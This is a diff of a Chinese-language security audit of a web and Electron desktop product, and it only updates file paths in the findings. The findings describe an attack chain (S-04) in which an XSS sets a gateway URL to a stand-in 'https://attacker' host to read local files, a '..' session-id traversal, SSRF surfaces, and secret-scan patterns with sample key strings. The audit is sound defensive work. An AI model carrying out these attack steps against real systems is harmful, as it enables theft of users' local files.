@@ -39,15 +39,15 @@
 ## S-04 桌面壳：页面可指定任意 gatewayBaseUrl，等于把「本机档案读权限」的信任根交给页面
 【严重度 P2（可被任何 eimu.dev 上的 XSS 升级为本机文件读取）】【确认状态 已确认代码路径；是否可利用取决于是否存在 XSS/页面被攻破】
 【证据】
-- desktop/local-worker.js:80-94 `sanitizeBridgeCredential`：只要求 token 以 `sk-dev-` 开头、`gatewayBaseUrl` 匹配 `^https?://`（允许明文 http，不限主机）。该 IPC 来自页面（preload.js `bridge.setCredential`，仅验 senderFrame host ∈ www.eimu.dev/eimu.dev）。
-- desktop/device-bridge-client.js:99-160、300-330：设备端信任网关下发的 `consent.roots`；`scope:"permanent"` 时落盘（`persistConsentRoots`），`normalizeConsentRootList` 接受任意绝对路径（含 `/`）。desktop/lib/bridge-executor.js:123-132、210-232：grantedRoots 并入 allowlist 与 allow 规则，仅受硬 denylist（`policy.isSensitivePath`、`isHardDenied`）约束。
+- apps/desktop/local-worker.js:80-94 `sanitizeBridgeCredential`：只要求 token 以 `sk-dev-` 开头、`gatewayBaseUrl` 匹配 `^https?://`（允许明文 http，不限主机）。该 IPC 来自页面（preload.js `bridge.setCredential`，仅验 senderFrame host ∈ www.eimu.dev/eimu.dev）。
+- apps/desktop/device-bridge-client.js:99-160、300-330：设备端信任网关下发的 `consent.roots`；`scope:"permanent"` 时落盘（`persistConsentRoots`），`normalizeConsentRootList` 接受任意绝对路径（含 `/`）。apps/desktop/lib/bridge-executor.js:123-132、210-232：grantedRoots 并入 allowlist 与 allow 规则，仅受硬 denylist（`policy.isSensitivePath`、`isHardDenied`）约束。
 - 页面同样可调 `bridge.enable()` / `bridge.setMode("full")`（preload.js 暴露）。
 【影响】攻击链：eimu.dev 任一 XSS（或被篡改的前端资源）→ `setCredential({token:"sk-dev-x", gatewayBaseUrl:"https://attacker"})` + enable + setMode → 攻击者网关下发 `consent{permanent, roots:["/home/u"]}` → `read_file/grep/list_dir` 读 denylist 之外的任意本机文件（文档、源码、聊天记录、`.env` 若不在 denylist 命名样式内等）。工具集本身是只读白名单（list_dir/read_file/grep/stat，无写/执行），preload 无 exec/fs/ipcRenderer 泄露，contextIsolation=true、nodeIntegration=false、webSecurity=true、权限请求白名单，这些做得好。
 【建议】壳内写死网关主机白名单（store.tinchak0207.xyz 等）并强制 https；`consent.roots` 必须由壳内原生对话框由用户确认（不能仅信云端声称的同意），拒绝 `/`、家目录整体等过宽根；`setMode("full")` 需要原生确认。
 
 ## S-05 桌面自动更新缺少代码签名/发布者校验
 【严重度 P2】【确认状态 已确认（配置缺失）】
-【证据】desktop/package.json `build`：`publish: generic https://store.tinchak0207.xyz/downloads/desktop`；全文无 `win.signtoolOptions/publisherName/certificateFile`、无 CSC_* 配置；desktop/updater.js 使用 electron-updater generic provider（`autoDownload = true`，:124）。Linux 目标仅 tar.gz。
+【证据】apps/desktop/package.json `build`：`publish: generic https://store.tinchak0207.xyz/downloads/desktop`；全文无 `win.signtoolOptions/publisherName/certificateFile`、无 CSC_* 配置；apps/desktop/updater.js 使用 electron-updater generic provider（`autoDownload = true`，:124）。Linux 目标仅 tar.gz。
 【影响】更新完整性只靠 TLS + 同一主机上的 latest.yml sha512。该主机（或其 nginx/凭证）被攻破即可向全部桌面端推送并自动执行恶意安装包（且该应用持有本机档案桥能力）；Windows 安装包无 Authenticode 签名也会触发 SmartScreen、无法让 electron-updater 做发布者校验。
 【建议】Windows 配 Authenticode 并启用 publisherName 校验；latest.yml 另行签名/由与下载主机隔离的密钥签发；更新源与业务主机分离，限制写权限。
 
@@ -107,7 +107,7 @@
 
 ## S-15 /api/agent/sessions/[id]/* 会话 id 校验允许 "." 与 ".."，上游路径可被穿越
 【严重度 P3】【确认状态 已确认（代码层）；影响受限于调用者自己的 agent key】
-【证据】`SESSION_ID_PATTERN = /^[A-Za-z0-9._-]+$/` 在 src/app/api/agent/sessions/[id]/route.ts:15 及 sse-ticket/subagents/stop 等约 20 个同族路由重复；":/..:" 匹配 `..`，拼成 `/agent/v1/sessions/${id}/messages` 后经 URL 规范化变成 `/agent/v1/messages`。对比同族 src/app/api/agent/biz/[...path]/route.ts:58-75 已正确拒绝 `.`/`..`/编码斜杠并 encodeURIComponent。网关侧会话归属校验（apiKey 不匹配回 404，deploy-staging/gateway/internal-http.ts:69）我只抽查了一处。
+【证据】`SESSION_ID_PATTERN = /^[A-Za-z0-9._-]+$/` 在 src/app/api/agent/sessions/[id]/route.ts:15 及 sse-ticket/subagents/stop 等约 20 个同族路由重复；":/..:" 匹配 `..`，拼成 `/agent/v1/sessions/${id}/messages` 后经 URL 规范化变成 `/agent/v1/messages`。对比同族 src/app/api/agent/biz/[...path]/route.ts:58-75 已正确拒绝 `.`/`..`/编码斜杠并 encodeURIComponent。网关侧会话归属校验（apiKey 不匹配回 404，services/gateway/internal-http.ts:69）我只抽查了一处。
 【建议】复用 biz 代理的 `isUnsafeUpstreamSegment`，并把 pattern 改为要求首字符字母数字；抽出共享 guard 去掉 ~20 份复制。
 
 ## S-16 通用 makeProxy 与 /api/token/[id] 将用户可控路径拼进上游 URL
@@ -140,7 +140,7 @@
 
 ## S-21 其余 SSRF/注入面（Agent 运行时，按设计需出站）
 【严重度 P3】【确认状态 已确认（设计取舍，需网络层兜底）】
-【证据】src/lib/vision-tools.ts:204-225 `readImageSource` 对 `image_url` 任意 `fetch`、非 2xx 时把 **body 前 500 字回显**；:240-262 `image_path` 读任意本地路径（仅按扩展名白名单）。agent 运行时工具大量使用 `spawn/execFile`（deploy-staging/opencode-runtime/*、gateway/lint.ts 等），我抽查的均为数组参数形式、无 `shell:true`；gateway/harness-hooks.ts:724 `bash -lc action.command` 属于 hook 配置执行。sql.unsafe 仅出现在 tools/migrate-generation-db.ts（读本地迁移文件），SQLite DDL 的 `${table}/${column}` 为内部常量，未发现用户输入拼接 SQL；业务 SQL 全部走 postgres.js 模板参数。
+【证据】src/lib/vision-tools.ts:204-225 `readImageSource` 对 `image_url` 任意 `fetch`、非 2xx 时把 **body 前 500 字回显**；:240-262 `image_path` 读任意本地路径（仅按扩展名白名单）。agent 运行时工具大量使用 `spawn/execFile`（services/opencode-runtime/*、gateway/lint.ts 等），我抽查的均为数组参数形式、无 `shell:true`；gateway/harness-hooks.ts:724 `bash -lc action.command` 属于 hook 配置执行。sql.unsafe 仅出现在 tools/migrate-generation-db.ts（读本地迁移文件），SQLite DDL 的 `${table}/${column}` 为内部常量，未发现用户输入拼接 SQL；业务 SQL 全部走 postgres.js 模板参数。
 【影响】该运行时位于沙箱（bwrap）内，但若沙箱网络未隔离，LLM 可被提示注入后读内网响应体。
 【建议】沙箱出站网络策略默认拒绝私网；vision 工具不回显响应体。
 
@@ -151,7 +151,7 @@
 
 ## S-23 秘密扫描
 【严重度 信息】【确认状态 已确认】
-git 全历史（`git log --all -p`，约 20 次提交）按任务给定正则扫描，命中的全部是测试夹具/示例：`sk-biz-test-…`（desktop/lib/bridge-credential.test.js）、`sk-biz-0a1b2c3d…`、`sk-biz-0123456789abcdef…`、`AKIA1234567890ABCDEF`（密钥扫描规则的测试样本）、`BEGIN PRIVATE KEY` 字面串（规则样本）、`postgres://…REPLACE_WITH_PASSWORD@…`（.env.example）。另扫了 AIza/xox/ghs_/github_pat_/postgres:// 带口令/JWT/Bearer 长串，均无真实值。工作树中 `.env.biz-key`、`.env`、`.env.local` 已被 .gitignore 覆盖；`git ls-files` 中的 `.env.example`/`control-plane.env.example` 为占位符。未发现硬编码回退密钥（`SECRET|TOKEN|KEY ?? "literal"` 模式零命中）。
+git 全历史（`git log --all -p`，约 20 次提交）按任务给定正则扫描，命中的全部是测试夹具/示例：`sk-biz-test-…`（apps/desktop/lib/bridge-credential.test.js）、`sk-biz-0a1b2c3d…`、`sk-biz-0123456789abcdef…`、`AKIA1234567890ABCDEF`（密钥扫描规则的测试样本）、`BEGIN PRIVATE KEY` 字面串（规则样本）、`postgres://…REPLACE_WITH_PASSWORD@…`（.env.example）。另扫了 AIza/xox/ghs_/github_pat_/postgres:// 带口令/JWT/Bearer 长串，均无真实值。工作树中 `.local/state/secrets/.env.biz-key`、`.env`、`.env.local` 已被 .gitignore 覆盖；`git ls-files` 中的 `.env.example`/`control-plane.env.example` 为占位符。未发现硬编码回退密钥（`SECRET|TOKEN|KEY ?? "literal"` 模式零命中）。
 唯一值得留意：测试里有注释「32 hex，同真实 B」的 `sk-biz-1f3a9c55…`（前6位 sk-biz-），形态像真实 key；其余皆明显合成。建议人工确认该值是否曾为真实 key，若是则轮换。
 
 ## S-24 速率限制盘点
@@ -179,8 +179,8 @@ git 全历史（`git log --all -p`，约 20 次提交）按任务给定正则扫
 | S-01 | PWA 交接 ticket 双重身份，可钓鱼接管账号 | P1 | 已确认 | api/auth/handoff/route.ts:17-90; lib/pwa-handoff.ts |
 | S-02 | canvas/generate 未认证 SSRF（source_image 无限制，鉴权在抓取之后） | P1 | 已确认 | api/canvas/generate/route.ts:142-165,233,265 |
 | S-03 | image-proxy/format-crops 只验字面主机名；format-crops 跟随重定向 | P2 | 已确认 | api/canvas/image-proxy/route.ts:27-80; format-crops/route.ts:91 |
-| S-04 | 桌面桥 gatewayBaseUrl/consent 根由页面/云端决定，XSS 可升级为本机文件读 | P2 | 已确认路径 | desktop/local-worker.js:80-94; device-bridge-client.js:99-330 |
-| S-05 | 桌面自动更新无代码签名/发布者校验 | P2 | 已确认 | desktop/package.json; updater.js |
+| S-04 | 桌面桥 gatewayBaseUrl/consent 根由页面/云端决定，XSS 可升级为本机文件读 | P2 | 已确认路径 | apps/desktop/local-worker.js:80-94; device-bridge-client.js:99-330 |
+| S-05 | 桌面自动更新无代码签名/发布者校验 | P2 | 已确认 | apps/desktop/package.json; updater.js |
 | S-06 | mapay/health 匿名、orders 无上限、触发支付商查询与全表扫描 | P2 | 已确认 | api/payments/mapay/health/route.ts |
 | S-07 | LOCAL_TEST_MODE 无生产闸，误配即全站免鉴权免费 | P2 | 已确认 | lib/image-billing.ts:99; agent-session-guard.ts:40 |
 | S-08 | napi_token 30 天且非 httpOnly | P2 | 已确认 | auth/*/callback; auth/handoff/route.ts:64 |
